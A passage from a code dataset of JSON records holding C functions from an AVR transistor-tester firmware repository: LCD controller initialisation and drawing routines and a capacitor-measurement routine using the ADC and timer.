| 7920 | 7108 | 8812 | 8814 | 7735 | 9163 | 1327) */\n/* must be a character display */\n   wait_about100ms();\n   // to initialise, send 3 times to be sure to be in 8 Bit mode\n\n #if LCD_INTERFACE_MODE == MODE_PARALLEL\n   lcd_command(0x33);\t\t\t// switch to 8-bit\n   lcd_command(0x32);\t\t\t// switch to 4-bit\n #else\n   lcd_command(0x3a);\t\t\t// switch to 8-bit for I2C or SPI\n #endif\n   wait_about10ms();\n #ifdef LCD_DOGM\n// - - - - - - - - - - - - - - - - \n   uint8_t contrast;\n   contrast = eeprom_read_byte(&EE_Volume_Value);\n  #if LCD_ST7565_V_FLIP\n   #define MODE_BDC 0x02\n  #else\n   #define MODE_BDC 0x00\n  #endif\n  #if LCD_ST7565_H_FLIP\n   #define MODE_BDS 0x01\n  #else\n   #define MODE_BDS 0x00\n  #endif\n  #ifdef FOUR_LINE_LCD\n   #if (FOUR_LINE_LCD != 3)\n   // enter 4-line mode for ssd1803a controller\n   lcd_command(CMD_SetIFOptions | MODE_8BIT | 0x0a);\t// 0x2a|0x3a 8Bit / 2 rows /RE=1\n   lcd_command(CMD_SetIFOptions | MODE_8BIT | 0x0a);\t// 0x2a|0x3a 8Bit / 2 rows /RE=1\n   lcd_command(0x09);\t\t\t\t// 5-dot font, 4 line display NW=1\n   lcd_command(0x04 | MODE_BDC | MODE_BDS);\t// BDC=1, bottom view\n   lcd_command(CMD1_SetBias | 0x0e);\t\t// 0x1e BS1:0=11, BS1=1\n   lcd_command(CMD_SetIFOptions | MODE_8BIT | 0x09);\t// 0x29 4Bit / 2 rows / 5x7 / Instr. table 1\n   lcd_command(CMD1_SetBias | 0x0b);\t\t// 0x1b BS0=1 / F2:0 = 3, Bias = 1/6\n   #define DEFAULT_RATIO 0x0e\n   #else\n   // 3-line display  dogm163\n   lcd_command(CMD_SetIFOptions | MODE_8BIT | 0x09);\t// 0x29 4Bit / 2 rows / 5x7 / Instr. table 1\n   lcd_command(CMD_SetIFOptions | MODE_8BIT | 0x09);\t// 0x29 4Bit / 2 rows / 5x7 / Instr. table 1\n   lcd_command(CMD1_SetBias | 0x0d);\t\t// 0x1d 1/4 bias, 3-lines     (5V)\n   #define DEFAULT_RATIO 0x0c\n   #endif\n  #else\n   // 2-line display dogm162\n   lcd_command(CMD_SetIFOptions | MODE_8BIT | 0x09);\t// 0x29 4Bit / 2 rows / 5x7 / Instr. table 1\n   lcd_command(CMD_SetIFOptions | MODE_8BIT | 0x09);\t// 0x29 4Bit / 2 rows / 5x7 / Instr. table 1\n   lcd_command(CMD1_SetBias | 0x0c);\t\t// 0x1c 1/4 bias     (5V)\n   #define DEFAULT_RATIO 0x0e\n  #endif\n\n\n   lcd_command(CMD1_PowerControl | ((contrast>>4)&0x07));     // 0x5x booster on,off / set contrast C5:C4 \n  #ifdef LCD_ST7565_RESISTOR_RATIO\n   lcd_command(CMD1_FollowerControl | 0x08 | LCD_ST7565_RESISTOR_RATIO);\t// 0x6e Follower on / Rab2:0 = RATIO\n  #else\n   lcd_command(CMD1_FollowerControl | DEFAULT_RATIO);\t// 0x6e Follower on / Rab2:0 = 6\n  #endif\n\n   lcd_command(CMD1_SetContrast | (contrast&0x0f));   // 0x7x set contrast C3:0 \n\n   // old initialize without OLED display\n   lcd_command(CMD_SetIFOptions | MODE_8BIT | 0x08);\t// 4Bit / 2 rows / 5x7 / Instruction Table 0\n   lcd_clear();\n   lcd_command(CMD_DISPLAY_ON);\t\t\t// 0x08 Display on, no Cursor, No blink\n   lcd_command(CMD_SetEntryMode | 0x02);\t// 0x06 increment / no Scroll    \n// - - - - - - - - - - - - - - - - \n #else\n   // initialize sequence with OLED display\n   lcd_command(CMD_SetIFOptions | MODE_8BIT);\t\t// Add for OLED\n   lcd_command(CMD_SetIFOptions | MODE_8BIT);\t\t// Add for OLED\n\n  #if defined(FOUR_LINE_LCD) && (FOUR_LINE_LCD != 3)             \n   // for KS0073 controller  set the 4-line mode with extended instruction\n   lcd_command(CMD_SetIFOptions | MODE_8BIT | 0x40 | 0x08); //enter extended instruction\n   lcd_command(CMD_SetDisplayAndCursor | 0x01);\t// enable 4-line mode\n  #endif\n   lcd_command(CMD_SetIFOptions | MODE_8BIT | 0x0A);\t// 4Bit / 2 rows / 5x7 / table3 / Add for OLED\n   lcd_command(CMD_SetDisplayAndCursor);\t// Display off / no Blinking  / Add for OLED\n   lcd_command(CMD_SetEntryMode | 0x02);\t// increment / no Scroll\n   lcd_command(CMD_CURSOR_HOME);\t\t// Home Command  // Add for OLED\n   lcd_clear();\n   wait_about5ms();\n   lcd_command(CMD_SetDisplayAndCursor | 0x04);\t// Display on / Cursor off / no Blinking\n #endif\n// - - - - - - - - - - - - - - - - \n\n   LCDLoadCustomChar(LCD_CHAR_DIODE1);\t//Custom-Character Diode symbol\n   lcd_fix_customchar(DiodeIcon1);\t//load Character  >|\n   LCDLoadCustomChar(LCD_CHAR_DIODE2);\t//Custom-Character \n   lcd_fix_customchar(DiodeIcon2);\t//load Character  |<\n   LCDLoadCustomChar(LCD_CHAR_CAP);\t//Custom-Character  Capacitor symbol\n   lcd_fix_customchar(CapIcon);\t\t//load Character  ||\n   LCDLoadCustomChar(LCD_CHAR_RESIS1);\t//Custom-Character Resistor symbol\n   lcd_fix_customchar(ResIcon1);\t\t//load Character  [\n   LCDLoadCustomChar(LCD_CHAR_RESIS2);\t//Custom-Character \n   lcd_fix_customchar(ResIcon2);\t\t//load Character  ]\n\t  \n   //if kyrillish LCD-Characterset is defined, load  Omega- and -Character\n #if LCD_CHAR_OMEGA < 8\n   LCDLoadCustomChar(LCD_CHAR_OMEGA);\t//load omega as Custom-Character\n   lcd_fix_customchar(CyrillicOmegaIcon);\n #endif\n #if LCD_CHAR_U < 8\n   LCDLoadCustomChar(LCD_CHAR_U);\t//load mu as Custom-Character\n   lcd_fix_customchar(CyrillicMuIcon);\n #endif\n #if LCD_CHAR_RESIS3 != 'R'\n   LCDLoadCustomChar(LCD_CHAR_RESIS3);\t//load Resistor symbol as Custom-Character\n   lcd_fix_customchar(ResIcon3);\t\t// load character ||\n #endif\n\n#endif\n}", "path": "Software\\trunk\\lcd-routines.c", "repo_name": "Mikrocontroller-net/transistortester", "stars": 306, "license": "None", "language": "c", "size": 195437}
{"docstring": "/* ******************************************************************************* */\n", "func_signal": "void lcd_update_icon_opt(const unsigned char *ubitmap, unsigned char options)", "code": "{\n const unsigned char *pfont;\n uint8_t xx, yy;\n uint8_t ww, hh;\n pfont =  &ubitmap[4];\t\t\t\t// the bitfield data begin at position 4\n xx = icon_xx + pgm_read_byte(&ubitmap[0]);\t// first byte = offset x to left (upper) corner of the Icon\n yy = icon_yy + pgm_read_byte(&ubitmap[1]);\t// second byte = offset y to (left) upper corner of the Icon\n ww =  pgm_read_byte(&ubitmap[2]);\t\t// the width of the bitfield\n hh =  pgm_read_byte(&ubitmap[3]);\t\t// the height of the bitfield (must be multiple of 8 for ST7565)\n lcd_set_pixels( pfont, xx, yy, options, ww, hh);\t// update the icon at the specified position with specified size\n}", "path": "Software\\trunk\\lcd-routines.c", "repo_name": "Mikrocontroller-net/transistortester", "stars": 306, "license": "None", "language": "c", "size": 195437}
{"docstring": "// sends a command to the LCD\n", "func_signal": "void lcd_command(unsigned char temp1)", "code": "{\n\t_lcd_hw_write(0x00,temp1);\n#if ((LCD_ST_TYPE == 7565) || (LCD_ST_TYPE == 1306) || (LCD_ST_TYPE == 7108) || (LCD_ST_TYPE == 7920) || (LCD_ST_TYPE == 8812) || (LCD_ST_TYPE == 8814) || (LCD_ST_TYPE == 7735) || (LCD_ST_TYPE == 9163) || (LCD_ST_TYPE == 9341) || (LCD_ST_TYPE == 1327))\n ;\n#else\n\twait50us();\t\t// wait at least 50us after every instruction for character LCD\n#endif\n}", "path": "Software\\trunk\\lcd-routines.c", "repo_name": "Mikrocontroller-net/transistortester", "stars": 306, "license": "None", "language": "c", "size": 195437}
{"docstring": "/* ******************************************************************************* */\n", "func_signal": "void lcd_show_Cg(void)", "code": "{\n       lcd_MEM_string(GateCap_str);             //\"Cg=\"\n#if FLASHEND > 0x1fff\n       if (cap.cpre < -3) {\n          DisplayValue(cap.cval,cap.cpre,'F',3);\n       } else {\n          lcd_data('?');\n       }\n#else\n       DisplayValue(cap.cval,cap.cpre,'F',3);\n#endif\n}", "path": "Software\\trunk\\lcd-routines.c", "repo_name": "Mikrocontroller-net/transistortester", "stars": 306, "license": "None", "language": "c", "size": 195437}
{"docstring": "/* ******************************************************************************* */\n//move to the beginning of the 3. row\n", "func_signal": "void lcd_line3()", "code": "{\n   lcd_text_line = 2;\n#if (LCD_GRAPHIC_TYPE != 0)\n   lcd_set_cursor(2 * PAGES_PER_LINE,0);\n#else\n   lcd_command((uint8_t)(CMD_SetDDRAMAddress + LCD_Row3));\n   _lcd_column = 0;\n#endif\n#ifdef WITH_UART\n   uart_newline();\t\t// start of new line\n #if WITH_UART == 2\t\t// MAURO\n   uart_putc('3');\t\t// MAURO\n #endif\t\t\t\t// MAURO\n#endif\n}", "path": "Software\\trunk\\lcd-routines.c", "repo_name": "Mikrocontroller-net/transistortester", "stars": 306, "license": "None", "language": "c", "size": 195437}
{"docstring": "//=================================================================\n", "func_signal": "void ReadCapacity(uint8_t HighPin, uint8_t LowPin)", "code": "{\n  // check if capacitor and measure the capacity value\n  unsigned int tmpint;\n//  unsigned int adcv[4];\n  int residual_voltage;\n  int cap_voltage1;\n  int cap_voltage2;\n#ifdef INHIBIT_SLEEP_MODE\n  unsigned int ovcnt16;\n#endif\n  uint8_t HiPinR_L, HiPinR_H;\n  uint8_t LoPinR_L;\n  uint8_t LoADC;\n  uint8_t ii;\n\n#if PROCESSOR_TYP == 666644  /* ########## not yet finshised ################ */\n  if (HighPin == TestCapPin) {\n     // special handling for build in calibration capacitor\n     ADC_PORT = TXD_VAL;\t\t// switch ADC-Port to GND\n     ADC_DDR = (1<<TestCapPin) | TXD_MSK;\t// switch capacitor-Pin to output (GND)\n     wait_about20ms();\n     ADC_DDR = TXD_MSK;\t\t\t// switch all ADC to input \n     residual_voltage = ReadADC(HighPin);\t\t// voltage before any load \n  }\n#endif\n\n#ifdef AUTO_CAL\n  pin_combination = ((HighPin - TP_MIN) * 3) + LowPin - TP_MIN - 1;\t// coded Pin combination for capacity zero offset\n#endif\n\n  HiPinR_L = pgm_read_byte(&PinRLRHADCtab[HighPin - TP_MIN]);\t//R_L mask for HighPin R_L load\n  LoPinR_L = pgm_read_byte(&PinRLRHADCtab[LowPin - TP_MIN]);\t//R_L mask for LowPin R_L load\n#if (((PIN_RL1 + 1) != PIN_RH1) || ((PIN_RL2 + 1) != PIN_RH2) || ((PIN_RL3 + 1) != PIN_RH3))\n  HiPinR_H = pgm_read_byte((&PinRLRHADCtab[3])+HighPin-TP_MIN);\t//R_H mask for HighPin R_H load\n  LoADC = pgm_read_byte((&PinRLRHADCtab[6])+LowPin-TP_MIN) | TXD_MSK;\n#else\n  HiPinR_H = HiPinR_L + HiPinR_L;\t//double for HighPin R_H load\n  LoADC = pgm_read_byte((&PinRLRHADCtab[3])+LowPin-TP_MIN) | TXD_MSK;\n#endif\n\n#if DebugOut == 10\n  lcd_line3();\n  lcd_clear_line();\n  lcd_line3();\n  lcd_testpin(LowPin);\n  lcd_data('C');\n  lcd_testpin(HighPin);\n  lcd_space();\n#endif\n  if(PartFound == PART_RESISTOR) {\n#if DebugOut == 10\n     lcd_data('R');\n     wait_about2s();\t/* debug delay */\n#endif\n     return;\t//We have found a resistor already \n  }\n  for (ii=0;ii<NumOfDiodes;ii++) {\n     if ((diodes.Cathode[ii] == LowPin) && (diodes.Anode[ii] == HighPin) && (diodes.Voltage[ii] < 1500)) {\n#if DebugOut == 10\n        lcd_data('D');\t// debug\n        wait_about2s();\t/* debug delay */\n#endif\n        return;\n     }\n  }\n  \n#if FLASHEND > 0x1fff\n  unsigned int vloss;\t// lost voltage after load pulse in 0.1% \n  cap.esr = 0;\t\t\t\t// set ESR of capacitor to zero\n  vloss = 0;\t\t\t\t// set lost voltage to zero\n#endif\n  cap.cpre = -15;\t\t\t// mark for no cap\n  cap.cval = 0;\t\t\t\t// set capacity value to zero\n  EntladePins();\t\t\t// discharge capacitor\n  ADC_PORT = TXD_VAL;\t\t\t// switch ADC-Port to GND\n// The polarity of residual voltage of the capacitor depends on the measurement\n// history. For the normal test cycle the residual voltage is negative\n// at the HighPin. Because the ADC can not measure a negative Voltage,\n// the LowPin voltage is shifted to 139mV with the R_L resistor.\n// The voltage of the capacitor is build as difference between HighPin and LowPin voltage.\n  ADC_DDR = LoADC;\t\t\t// switch Low-Pin to output (GND)\n  R_DDR = LoPinR_L;\t\t\t// switch R_L Port of LoPin to VCC\n  R_PORT = LoPinR_L;\t\t\t// switch R_L Port of LoPin to VCC\n  residual_voltage = ReadADC(HighPin) - ReadADC(LowPin); // voltage at HighPin before any load \n  R_DDR = 0;\t\t\t\t// switch all R_L ports to input\n  cap_voltage1 = 0;\t\t\t// preset to prevent compiler warning\n#define MAX_LOAD_TIME 500\n#define MIN_VOLTAGE 300\n  for (ovcnt16=0;ovcnt16<MAX_LOAD_TIME;ovcnt16++) {\n     R_PORT = HiPinR_L;\t\t\t//R_L to 1 (VCC) \n     R_DDR = HiPinR_L;\t\t\t//switch Pin to output, across R to GND or VCC\n     wait10ms();\t\t\t// wait exactly 10ms, do not sleep\n     R_DDR = 0;\t\t\t\t// switch back to input\n     R_PORT = 0;\t\t\t// no Pull up\n     wait500us();\t\t\t//wait a little time\n     wdt_reset();\n     // read voltage without current, is already charged enough?\n#ifdef big_cap_no_float\n     R_PORT = HiPinR_H;\t\t\t//R_H to 1 (VCC), to ensure that if nothing is connected, measured voltage will be Vcc, rather than float anywhere\n     R_DDR = HiPinR_H;\t\t\t// shouldn't influence the measurements significantly, since the R is almost 1000 times larger, and the time about 100 times shorter\n     cap_voltage1 = ReadADC(HighPin);\n     R_DDR = 0;\t\t\t\t// switch back to input\n     R_PORT = 0;\t\t\t// no Pull up\n     if (ovcnt16==0 && cap_voltage1 >=4096) {\n        // apparently very small capacitance, if it charges so quickly\n        goto messe_mit_rh;\n     }\n     cap_voltage1 -= residual_voltage; // voltage across capacitor\n#else\n     cap_voltage1 = ReadADC(HighPin) - residual_voltage; // voltage of capacitor\n#endif\n     if ((ovcnt16 > (MAX_LOAD_TIME/4)) && (cap_voltage1 < (MIN_VOLTAGE/4))) {\n        // 300mV can not be reached well-timed \n        break;\t\t// don't try to load any more\n     }\n     // probably 100mF can be charged well-timed \n     if (cap_voltage1 > MIN_VOLTAGE) {\n        break;\t\t// lowest voltage to get capacity from load time is reached\n     }\n  }  /* end for ovcnt16 */\n  // wait 5ms and read voltage again, does the capacitor keep the voltage?\n#if DebugOut == 10\n  DisplayValue16(ovcnt16,0,' ',4);\n  Display_mV(cap_voltage1,4);\n#endif\n  if (cap_voltage1 <= MIN_VOLTAGE) {\n#if DebugOut == 10\n     lcd_data('K');\n     lcd_space();\n     wait1s();\t\t// debug delay\n#endif\n//     if (NumOfDiodes != 0) goto messe_mit_rh; /* ****************************** */\n     goto keinC;\t\t// was never charged enough, >100mF or shorted\n  }\n  //voltage is rised properly and keeps the voltage enough\n  if ((ovcnt16 == 0 ) && (cap_voltage1 > 1300)) {\n     goto messe_mit_rh;\t\t// Voltage of more than 1300mV is reached in one pulse, too fast loaded\n  }\n  // Capacity is more than about 50F\n#ifdef NO_CAP_HOLD_TIME\n  ChargePin10ms(HiPinR_H,0);\t\t//switch HighPin with R_H 10ms auf GND, then currentless\n  cap_voltage2 = ReadADC(HighPin) - residual_voltage;\t// read voltage again, is discharged only a little bit ?\n #if DebugOut == 10\n  lcd_data('U');\n  lcd_data('3');\n  lcd_data(':');\n  u2lcd_space(cap_voltage2);\n  wait_about2s();\t/* debug delay */\n #endif\n  if ((cap_voltage2 + cap_voltage2) < cap_voltage1) {\n #if DebugOut == 10\n     lcd_data('H');\n     lcd_space();\n     wait_about1s();\t/* debug delay */\n #endif\n//     if (ovcnt16 == 0 )  {\n//        goto messe_mit_rh;\t\t// Voltage of more than 300mV is reached in one pulse, but not hold\n//     }\n     goto keinC; //implausible, not yet the half voltage\n  }\n  cap.cval_uncorrected.dw = ovcnt16 + 1;\n  cap.cval_uncorrected.dw *= GetRLmultip(cap_voltage1);\t\t// get factor to convert time to capacity from table\n#else\n  // wait the half the time which was required for loading\n  cap_voltage2 = cap_voltage1;\t\t\t// preset to prevent compiler warning\n  for (tmpint=0;tmpint<=ovcnt16;tmpint++) {\n     wait5ms();\n     cap_voltage2 = ReadADC(HighPin) - residual_voltage;\t// read voltage again, is discharged only a little bit ?\n     wdt_reset();\n  }\n     cap_voltage2 = cap_voltage1 - cap_voltage2; \t// lost voltage during load time wait\n#if FLASHEND > 0x1fff\n  // compute equivalent parallel resistance from voltage drop\n  if (cap_voltage2 > 0) {\n     // there is any voltage drop !\n     // cap_voltage1 is the loaded voltage.\n     vloss = (unsigned long)(cap_voltage2 * 1000UL) / cap_voltage1;\n  }\n#endif\n  if (cap_voltage2 > 200) {\n     // more than 200mV is lost during load time\n #if DebugOut == 10\n     lcd_data('L');\n     lcd_space();\n     wait_about1s();\t/* debug delay */\n #endif\n//     if (ovcnt16 == 0 )  {\n//        goto messe_mit_rh;\t\t// Voltage of more than 300mV is reached in one pulse, but not hold\n//     }\n     goto keinC;\t\t\t// capacitor does not keep the voltage about 5ms\n  }\n  cap.cval_uncorrected.dw = ovcnt16 + 1;\n  // compute factor with load voltage + lost voltage during the voltage load time\n  cap.cval_uncorrected.dw *= GetRLmultip(cap_voltage1+cap_voltage2);\t// get factor to convert time to capacity from table\n#endif\n   cap.cval = cap.cval_uncorrected.dw;\t// set result to uncorrected\n   cap.cpre = -9;\t\t// switch units to nF \n   Scale_C_with_vcc();\t\t// value is below 100000 after this call, cpre is changed\n   // cap.cval for this type is at least 40000nF, so the last digit will be never shown\n#if WITH_MENU\n   cap.cval *= (1000 - (int8_t)eeprom_read_byte((uint8_t *)&big_cap_corr));\t// correct with C_H_KORR with 0.1% resolution, but prevent overflow\n#else\n   cap.cval *= (1000 - C_H_KORR);\t// correct with C_H_KORR with 0.1% resolution, but prevent overflow\n#endif\n   cap.cval /= 100;\t\t// was multiplied with 1000, now divided by 100\n#if DebugOut == 10\n   lcd_line3();\n   lcd_clear_line();\n   lcd_line3();\n   lcd_testpin(LowPin);\n   lcd_data('C');\n   lcd_testpin(HighPin);\n   lcd_space();\n   DisplayValue(cap.cval,cap.cpre,'F',4);\n   lcd_space();\n   u2lcd(ovcnt16);\n   wait_about3s();\t/* debug delay */\n#endif\n   goto checkDiodes;\n\n//==================================================================================\n// Measurement of little capacity values\nmesse_mit_rh:\n  //little capacity value, about  < 50 F\n  EntladePins();\t\t\t// discharge capacitor\n  //measure with the R_H (470kOhm) resistor \n  R_PORT = 0;\t\t// R_DDR ist HiPinR_L\n  ADC_DDR = (1<<TP1) | (1<<TP2) | (1<<TP3) | TXD_MSK;\t//switch all Pins to output\n  ADC_PORT = TXD_VAL;\t\t//switch all ADC Pins to GND\n  R_DDR = HiPinR_H;   \t\t// switch R_H resistor port for HighPin to output (GND)\n// setup Analog Comparator\n  ADC_COMP_CONTROL = (1<<ACME);\t\t\t//enable Analog Comparator Multiplexer\n  ACSR =  (1<<ACBG) | (1<<ACI)  | (1<<ACIC);\t// enable, 1.3V, no Interrupt, Connect to Timer1 \n  ADMUX = (1<<REFS0) | HighPin;\t\t\t// switch Mux to High-Pin\n  ADCSRA = (1<<ADIF) | AUTO_CLOCK_DIV; //disable ADC\n  wait200us();\t\t\t//wait for bandgap to start up\n\n// setup Counter1\n  ovcnt16 = 0;\n  TCCR1A = 0;\t\t\t// set Counter1 to normal Mode\n  TCNT1 = 0;\t\t\t//set Counter to 0\n  TI1_INT_FLAGS = (1<<ICF1) | (1<<OCF1B) | (1<<OCF1A) | (1<<TOV1);\t// clear interrupt flags\n#ifndef INHIBIT_SLEEP_MODE\n  TIMSK1 = (1<<TOIE1) | (1<<ICIE1);\t// enable Timer overflow interrupt and input capture interrupt\n  unfinished = 1;\n#endif\n  R_PORT = HiPinR_H;           \t// switch R_H resistor port for HighPin to VCC\n  if(PartFound == PART_FET) {\n     // charge capacitor with R_H resistor\n     TCCR1B = (0<<ICNC1) | (1<<CS10);\t//Start counter 1MHz or 8MHz without Noise Canceler\n     ADC_DDR = (((1<<TP1) | (1<<TP2) | (1<<TP3) | TXD_MSK) & ~(1<<HighPin));\t// release only HighPin ADC port\n  } else {\n     TCCR1B =  (0<<ICNC1) | (1<<CS10);\t//start counter 1MHz or 8MHz without Noise Canceler\n     ADC_DDR = LoADC;\t\t// stay LoADC Pin switched to GND, charge capacitor with R_H slowly\n  }\n//******************************\n#ifdef INHIBIT_SLEEP_MODE\n  while(1) {\n     // Wait, until  Input Capture is set\n     ii = TI1_INT_FLAGS;\t//read Timer flags\n     if (ii & (1<<ICF1))  {\n        break;\n     }\n     if((ii & (1<<TOV1))) {\t// counter overflow, 65.536 ms @ 1MHz, 8.192ms @ 8MHz\n        TI1_INT_FLAGS = (1<<TOV1);\t// Reset OV Flag\n        wdt_reset();\n        ovcnt16++;\n        if(ovcnt16 == (F_CPU/5000)) {\n           break; \t\t//Timeout for Charging, above 12 s\n        }\n     }\n  }\n  TCCR1B = (0<<ICNC1) | (0<<ICES1) | (0<<CS10);  // stop counter\n  TI1_INT_FLAGS = (1<<ICF1);\t\t// Reset Input Capture\n  tmpint = ICR1;\t\t// get previous Input Capture Counter flag\n// check actual counter, if an additional overflow must be added\n  if((TCNT1 > tmpint) && (ii & (1<<TOV1))) {\n     // this OV was not counted, but was before the Input Capture\n     TI1_INT_FLAGS = (1<<TOV1);\t\t// Reset OV Flag\n     ovcnt16++;\n  }\n#else\n  cli();\t\t// disable interrupts to prevent wakeup Interrupts before sleeping\n  set_sleep_mode(SLEEP_MODE_IDLE);\n  while(unfinished) {\n    sleep_enable();\n    sei();\t\t// enable interrupts after next instruction\n    sleep_cpu();\t// only enable interrupts during sleeping\n    sleep_disable();\n    cli();\t\t// disable interrupts again\n    wdt_reset();\t// reset watch dog during waiting\n    if(ovcnt16 == (F_CPU/5000)) {\n       break; \t\t//Timeout for Charging, above 12 s\n    }\n  }\n  sei();\t\t// enable interrupts again\n  TCCR1B = (0<<ICNC1) | (0<<ICES1) | (0<<CS10);  // stop counter\n  tmpint = ICR1;\t\t// get previous Input Capture Counter flag\n  TIMSK1 = (0<<TOIE1) | (0<<ICIE1);\t// disable Timer overflow interrupt and input capture interrupt\n#endif\n\n#if DebugOut == 11\n  // test output for checking error free load time measurement\n  // select a capacitor, which gives a load time of about 65536 clock tics\n  if ((LowPin == TP1) && (HighPin == TP3)) {\n    lcd_line3();\n    lcd_clear_line();\n    lcd_line3();\n    if (ovcnt16 != 0) {\n      DisplayValue16(ovcnt16,0,',',4);\n    }\n    u2lcd(tmpint);\n  }\n#endif\n\n//############################################################\n  ADCSRA = (1<<ADEN) | (1<<ADIF) | AUTO_CLOCK_DIV; //enable ADC\n  R_DDR = 0;\t\t\t// switch R_H resistor port for input\n  R_PORT = 0;\t\t\t// switch R_H resistor port pull up for HighPin off\n  load_diff = ReadADC(HighPin) + REF_C_KORR - ref_mv;\t// build difference of capacitor voltage to Reference Voltage\n//############################################################\n  if (ovcnt16 >= (F_CPU/10000)) {\n#if DebugOut == 10\n     lcd_data('k');\n     wait_about1s();\t/* debug delay */\n#endif\n     goto keinC;\t// no normal end\n  }\n//  cap.cval_uncorrected = CombineII2Long(ovcnt16, tmpint);\n  cap.cval_uncorrected.w[1] = ovcnt16;\n  cap.cval_uncorrected.w[0] = tmpint;\n\n  cap.cpre = -12;\t\t\t// cap.cval unit is pF \n  if (ovcnt16 > 65) {\n     cap.cval_uncorrected.dw /= 100;\t// switch to next unit\n     cap.cpre += 2;\t\t\t// set unit, prevent overflow\n  }\n  cap.cval_uncorrected.dw *= RHmultip;\t\t// 708\n  cap.cval_uncorrected.dw /= (F_CPU / 10000);\t// divide by 100 (@ 1MHz clock), 800 (@ 8MHz clock)\n  cap.cval = cap.cval_uncorrected.dw;\t\t// set the corrected cap.cval\n  Scale_C_with_vcc();\n  if (cap.cpre == -12) {\n#if COMP_SLEW1 > COMP_SLEW2\n     if (cap.cval < COMP_SLEW1) {\n        // add slew rate dependent offset\n        cap.cval += (COMP_SLEW1 / (cap.cval+COMP_SLEW2 ));\n     }\n#endif\n#ifdef SamplingADC\n     // store as reference for inductance measurement\n     // note that we store this before subtracting cap_null, since for inductance measurement that cap. also contributes\n     if ( cap.cval < 65536) lc_cpartmp=cap.cval; /* prevent wrong value */\n     else                   lc_cpartmp = 1;\t/* set to 1pF, if too big */\n#endif /* SamplingADC */\n#ifdef AUTO_CAL\n     // auto calibration mode, cap_null can be updated in selftest section\n     tmpint = eeprom_read_byte(&c_zero_tab[pin_combination]);\t// read zero offset\n     if (cap.cval > tmpint) {\n         cap.cval -= tmpint;\t\t//subtract zero offset (pF)\n     } else {\n #if FLASHEND > 0x3fff\n       if ((cap.cval+C_LIMIT_TO_UNCALIBRATED) < tmpint) {\n         mark_as_uncalibrated();\t// set in EEprom to uncalibrated\n  #if DebugOut == 11\n         lcd_line3();\n         lcd_testpin(LowPin);\n         lcd_data('y');\n         lcd_testpin(HighPin);\n         lcd_space();\n  #endif\n       }\n #endif\n         cap.cval = 0;\t\t\t//unsigned long may not reach negativ value\n     }\n#else  /* no AUTO_CAL */\n     if (HighPin == TP2) cap.cval += TP2_CAP_OFFSET;\t// measurements with TP2 have 2pF less capacity\n     if (cap.cval > C_NULL) {\n         cap.cval -= C_NULL;\t\t//subtract constant offset (pF)\n     } else {\n         cap.cval = 0;\t\t\t//unsigned long may not reach negativ value\n     }\n#endif\n  } /* end if (cap.cpre == -12) */\n\n#if DebugOut == 10\n  R_DDR = 0;\t\t\t// switch all resistor ports to input\n  lcd_line4();\n  lcd_clear_line();\n  lcd_line4();\n  lcd_testpin(LowPin);\n  lcd_data('c');\n  lcd_testpin(HighPin);\n  lcd_space();\n  DisplayValue(cap.cval,cap.cpre,'F',4);\n  wait_about3s();\t/* debug delay */\n#endif\n  R_DDR = HiPinR_L; \t\t//switch R_L for High-Pin to GND\n#if F_CPU < 2000001\n   if(cap.cval < 50)\n#else \n   if(cap.cval < 25)\n#endif \n     {\n     // cap.cval can only be so little in pF unit, cap.cpre must not be testet!\n#if DebugOut == 10\n     lcd_data('<');\n     lcd_space();\n     wait_about1s();\t/* debug delay */\n#endif\n      goto keinC;\t//capacity to low, < 50pF @1MHz (25pF @8MHz)\n   }\n   // end low capacity \ncheckDiodes:\n   if((NumOfDiodes > 0)  && (PartFound != PART_FET)) {\n#if DebugOut == 10\n      lcd_data('D');\t// debug\n      lcd_space();\n      wait_about1s();\t/* debug delay */\n#endif\n      // nearly sure, that there is one or more diodes in reverse direction,\n      // which would be wrongly detected as capacitor \n   } else {\n      PartFound = PART_CAPACITOR;\t//capacitor is found\n      if ((cap.cpre > cap.cpre_max) || ((cap.cpre == cap.cpre_max) && (cap.cval > cap.cval_max))) {\n         // we have found a greater one, overwrite the old values\n         cap.cval_max = cap.cval;\n         cap.cpre_max = cap.cpre;\n#if FLASHEND > 0x1fff\n         cap.v_loss = vloss;\t\t// lost voltage in 0.01%\n#endif\n         cap.ca = LowPin;\t\t// save LowPin\n         cap.cb = HighPin;\t\t// save HighPin\n      }\n   }\n\nkeinC:\n  // discharge capacitor again\n//  EntladePins();\t\t// discharge capacitors\n  //ready\n  // switch all ports to input\n  ADC_DDR =  TXD_MSK;\t\t// switch all ADC ports to input\n  ADC_PORT = TXD_VAL;\t\t// switch all ADC outputs to GND, no pull up\n  R_DDR = 0;\t\t\t// switch all resistor ports to input\n  R_PORT = 0; \t\t\t// switch all resistor outputs to GND, no pull up\n  return;\n } // end ReadCapacity()\n\n\nvoid Scale_C_with_vcc(void) {\n   while (cap.cval > 100000) {\n      cap.cval /= 10;\n      cap.cpre ++;\t\t\t// prevent overflow\n   }\n   cap.cval *= ADCconfig.U_AVCC;\t// scale with measured voltage\n   cap.cval /= U_VCC;\t\t\t// Factors are computed for U_VCC\n}", "path": "Software\\trunk\\ReadCapacity.c", "repo_name": "Mikrocontroller-net/transistortester", "stars": 306, "license": "None", "language": "c", "size": 195437}
{"docstring": "/* ******************************************************************************* */\n// send the command to clear the display \n", "func_signal": "void lcd_clear(void)", "code": "{\n   \n#if ((LCD_ST_TYPE == 7565) || (LCD_ST_TYPE == 1306))\n   unsigned char p;\n   unsigned char count;\n\n   for (p = 0; p < (SCREEN_HEIGHT / 8); p++) {\n     lcd_command(CMD_SET_COLUMN_UPPER);\t\t// set horizontal position to 0\n     lcd_command(CMD_SET_COLUMN_LOWER);\n     lcd_command(CMD_SET_PAGE | (0x0f & p));\t// set page 0 to 7\n     for (count = 0; count < 132; count++)\n       lcd_write_data(0);\n   }\n#elif (LCD_ST_TYPE == 8812)\n   unsigned char p;\n   unsigned char count;\n\n   for (p = 0; p < (SCREEN_HEIGHT / 8); p++) {\n     lcd_command(CMD_SET_COLUMN);\t\t// set horizontal position to 0\n     lcd_command(CMD_SET_PAGE | (0x0f & p));\t// set page 0 to 7\n     for (count = 0; count < SCREEN_WIDTH; count++)\n       lcd_write_data(0);\n   }\n#elif (LCD_ST_TYPE == 8814)\n   unsigned char p;\n   unsigned char count;\n\n   for (p = 0; p < ((SCREEN_HEIGHT+7) / 8); p++) {\n     lcd_command(CMD_SET_COLUMN_UPPER);\t\t// set horizontal position to 0\n     lcd_command(CMD_SET_COLUMN_LOWER);\n     lcd_command(CMD_SET_PAGE | (0x0f & p));\t// set page 0 to 7\n     for (count = 0; count < SCREEN_WIDTH; count++)\n   